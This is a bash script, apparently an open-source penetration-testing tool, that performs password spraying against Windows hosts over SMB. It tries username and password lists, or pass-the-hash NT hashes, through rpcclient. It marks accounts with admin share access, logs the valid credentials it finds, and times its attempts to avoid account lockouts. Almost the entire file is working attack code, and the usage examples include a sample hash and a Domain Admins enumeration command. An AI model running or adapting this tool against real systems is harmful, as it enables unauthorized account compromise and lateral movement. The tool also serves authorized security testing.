#!/usr/bin/env bash
#
#    Copyright (C) 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# TODO:
# * Add support for IP address/range targets
# * Implement mutual exclusive options for the argpasrser
# * Implement share spidering
# * Usage menu to do

# enable stricter programming rules (turns some bugs into errors)
# set -Eeuo pipefail

declare -gr  PROGNAME=$(basename $0)
declare -gr  PROGBASENAME=${PROGNAME%%.*}
declare -gr  PROGDIR=$(dirname ${BASH_SOURCE[0]})
declare -gr  PROGVERSION=0.6dev
declare -gr  GIT_BRANCH='dev'
declare -gar REQUIRED_PACKAGES=( # to comment when experiencing any issue with the dependencies
    'coreutils'
    'smbclient'
)

declare -ga RPCCLIENT_OPTIONS=('--signing=on')
declare -gr DATE_FORMAT='+%d/%m/%Y-%H:%M:%S'

declare -gr CREDS_SEPARATOR=':'
declare -gi CFLAG=false

declare -ga DOMAINS
declare -ga HOSTS
declare -gi LOCKOUT_DURATION=1800 # 30 mins
declare -gi LOCKOUT_THRESHOLD=3
declare -g  OUT_FOLDER="${PROGDIR}/logs"
declare -ga PASSWORDS
declare -ga USERS
declare -gi VERBOSE=0

function print()        { printf "%s » %s\n" "${PROGBASENAME}" "${@}"; }
function printAttempt() { printf "%s » %-48.48s %-48.48s %s\n" "${PROGBASENAME}" "$1" "$2" "$3"; }
function printDate()    { printf "%s > %s » %s\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "${@}"; }
function printError()   { printf "%s > error » %s\n" "${PROGBASENAME}" "${@}"; }
function printLockout() { 
    printf "%s > %s » The attack has been paused for %s seconds (approx. %s minutes) to prevent accounts from \
being locked out...\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "$LOCKOUT_DURATION" "$(($LOCKOUT_DURATION / 60))"
}

trap quit INT

function quit() { 
    print "Trapped CTRL-C"
    exit 130
}

function writeLocked()  {
    if ! [[ -f "${OUT_FOLDER}/locked.log" ]]
    then
        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/locked.log"
    fi

    printf "%s %s\n" "$(date "$DATE_FORMAT")" "${@}" >> "${OUT_FOLDER}/locked.log"
}

function writeResult() { 
    if ! [[ -f "${OUT_FOLDER}/$2" ]]
    then
        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/$2.log"
    fi

    printf "%s %s\n" "$(date "$DATE_FORMAT")" "$1" >> "${OUT_FOLDER}/${2}.log"
}

function parseArgs() {
    local dflag=false # boolean domain
    local hflag=false # boolean host
    local pflag=false # boolean password
    local uflag=false # boolean user
    local eflag=false # boolean exit

    while (($# > 0))
    do
        case $1 in
            --help)
                usage
                exit 0
                ;;  
            -v)
                VERBOSE=1
                ;;            
            -vv)
                VERBOSE=2
                ;;
            -V|--version)
                banner
                exit 0
                ;;
            --creds)
                pflag=true
                uflag=true
                CFLAG=true
                OPTARG=$(realpath $2)

                if [[ -f $OPTARG ]]
                then
                    utemp=$(mktemp XXXXXXXXXXXXXXXX)
                    ptemp=$(mktemp XXXXXXXXXXXXXXXX)
                    awk -F "$CREDS_SEPARATOR" '{ print $1 }' $OPTARG > $utemp
                    awk -F "$CREDS_SEPARATOR" '{ print $2 }' $OPTARG > $ptemp
                    loadArray $utemp USERS
                    loadArray $ptemp PASSWORDS
                    rm -f $utemp $ptemp
                else
                    printError "$OPTARG is not a valid file"
                    exit 1
                fi
                ;;
            -d)
                dflag=true
                DOMAINS=($2)
                ;;
            -D)
                dflag=true
                loadArray $2 DOMAINS
                ;;
            -h)
                hflag=true
                HOSTS=($2)
                ;;
            -H)
                hflag=true
                loadArray $2 HOSTS
                ;;
            -la) # local authentication
                dflag=true
                DOMAINS=('WORKGROUP')
                ;;
            -ld)
                LOCKOUT_DURATION=$2
                ;;
            -lt) 
                LOCKOUT_THRESHOLD=$2
                ;;
            -o)
                OUT_FOLDER=$2
                ;;
            --pth)
                RPCCLIENT_OPTIONS+=('--pw-nt-hash')
                ;;
            -p)
                pflag=true
                PASSWORDS=($2)
                ;;
            -P)
                pflag=true
                loadArray $2 PASSWORDS
                ;;        
            -u)
                uflag=true
                USERS=($2)
                ;;
            -U)
                uflag=true
                loadArray $2 USERS
                ;;       
            -*)
                printf "%s: illegal option -- %s\n" "$PROGNAME" "$OPT"
                exit 1
                ;;
        esac
        
        shift      
    done

    if [[ $dflag = false || $hflag = false || $pflag = false || $uflag = false ]]
    then
        eflag=true
        printf "%s: missing mandatory option(s)\n" "${PROGNAME}"
    fi

    if [[ $eflag = true ]]
    then
        printf "%s: type '%s --help' for more information\n" "${PROGNAME}" "${PROGNAME}"
        exit 1
    fi
}

function usage() {
cat <<- USAGE

Usage: $PROGNAME [OPTIONS]

Perform password spraying attacks. Spray and pray!

Mandatory arguments:
    -d              domain name
    -D              file containing the domain name(s) (one entry per line) or folder containing the files containing the domain name(s)
    -h              host
    -H              file containing the host(s) (one entry per line) or folder containing the files containing the host(s)
    -p              password
    -P              file containing the password(s) (one entry per line) or folder containing the files containing the password(s)
    -u              user
    -U              file containing the user(s) (one entry per line) or folder containing the files containing the user(s)

Optional arguments:
    -o              directory where the log files will be written to
    -v              output each attempts (default: only success and lockouts), print the script parameters detail
    -V, --version   show the banner/version

Examples:
    bash $PROGNAME -u jsmith -p password1 -d workgroup -H 192.168.0.1
    bash $PROGNAME -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
    bash $PROGNAME -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group "Domain Admins" /domain'
USAGE
}

function banner() {
    local -ar vars=('DOMAINS' 'HOSTS' 'PASSWORDS' 'USERS' 'LOCKOUT_DURATION' 'LOCKOUT_THRESHOLD' 'OUT_FOLDER' 'VERBOSE')

cat <<- BANNER
${PROGBASENAME^^} v${PROGVERSION}
Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31

BANNER

    if [[ $VERBOSE = 2 ]]
    then
        for var in ${vars[@]}
        do
            declare -p $var
        done

        echo ""
    fi
}

function checkRequirements() {
    local eflag=false
    
    print 'Bash version check...'
    if ((BASH_VERSINFO[0] < 4))
    then 
        eflag=true
        printError "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
    else
        print 'The bash minimum version requirement is satisfied'
    fi

    print 'Dependencies check...'
    for package in ${REQUIRED_PACKAGES[@]}
    do
        if [[ -n $(dpkg -s $package 2> /dev/null) ]]
        then
            continue
        else
            eflag=true
            printError "The $package package is missing. Install it with: sudo apt-get install $package -y"
        fi
    done

    if [[ $eflag = true ]]
    then
        exit 1
    fi

    print 'All of the required packages are already installed'
}

function loadArray() {
    local -n _vars=$2 # referenced copy of the array passed to the function
    local -a vars

    if [[ -d $(realpath $1) ]]
    then
        for i in $(realpath $1)/*
        do
            readarray -t var < $(realpath "$i")
            _vars+=(${vars[@]})
            unset vars
        done
    elif [[ -f $(realpath $1) ]]
    then
        readarray -t _vars < $(realpath $1)
    else
        printError "$1 is not a valid directory or file"
        exit 1
    fi
}

# improve output process
function spray() {
    local -i counter=0
    local    isAdmin=false  # boolean for admin creds
    local    vflag=false    # boolean verbose
    
    local    output
    local    var
    local    var1
    local    var2
    
    local    password
    local    username

    local -a _PASSWORDS     # local copy of PASSWORDS
    local -a _USERS         # local copy of USERS

    _PASSWORDS=(${PASSWORDS[@]})    # remove blank/empty entries

    for domain in ${DOMAINS[@]}
    do
        for host in ${HOSTS[@]}
        do
            _USERS=(${USERS[@]})    # remove blank/empty/found entries

            for ((i=false; i <= ((${#_PASSWORDS[@]} - 1)); i++))
            do 
                password=${_PASSWORDS[i]}
                ((counter++))

                for ((j=false; j <= ((${#_USERS[@]} - 1)); j++))
                do 
                    if [[ $CFLAG = true ]]
                    then
                        j=$i
                    fi

                    user=${_USERS[j]}
                    isAdmin=false
                    var="${host}:139:"
                    var1="${domain}\\${user}:${password}"

                    res=$(rpcclient "${RPCCLIENT_OPTIONS[@]}" --workgroup="$domain" -U "${user}%${password}" -c 'getusername' "$host")

                    if [[ $res =~ 'Cannot connect to server.' ]]
                    then
                        ERROR=$(echo $res | awk '{print $NF}')
                        var2=" -> LOGON FAILED (${ERROR})"

                        if [[ $ERROR = 'NT_STATUS_ACCOUNT_LOCKED_OUT' ]]
                        then
                            writeLocked "${domain}\\${user}"
                            vflag=true
                        fi
                    else
                        var2=' -> LOGON SUCCESS '

                        res=$(rpcclient "${RPCCLIENT_OPTIONS[@]}" --workgroup="$domain" -U "${user}%${password}" -c 'netsharegetinfo ADMIN$' "$host")

                        if [[ $res =~ 'netname' ]]
                        then
                            var2+='(Pwn3d!)'
                            isAdmin=true
                        fi

                        writeResult "${domain}\\${user}:${password} $isAdmin" "$host"

                        # delete the current user entry and reindex the _USERS list
                        if [[ $CFLAG = false ]]
                        then
                            unset _USERS[j]
                            _USERS=(${_USERS[@]})
                        fi

                        vflag=true
                    fi

                    if [[ $VERBOSE > 0 || $vflag = true ]]
                    then
                        printAttempt "$var" "$var1" "$var2"
                        vflag=false
                    fi

                    if [[ $CFLAG = true ]]
                    then
                        break
                    fi
                done

                if ! [[ ${_USERS[@]} ]] # 100% success rate case
                then
                    print "All the supplied accounts' passwords have been uncovered on $domain\\$host"
                    break
                fi

                # avoid account lockout
                if ! (( $counter % $LOCKOUT_THRESHOLD ))
                then
                    printLockout
                    sleep $LOCKOUT_DURATION
                fi
            done
        done
    done
}

function main() {
    STARTTIME=$(date '+%s')
    printDate "Starting password spraying attack..."

    spray

    ENDTIME=$(date '+%s')
    ELAPSED=$(($ENDTIME - $STARTTIME))
    printDate "It took $(($ELAPSED / 60)) minutes to completed"
}

parseArgs "$@"
banner
checkRequirements
main
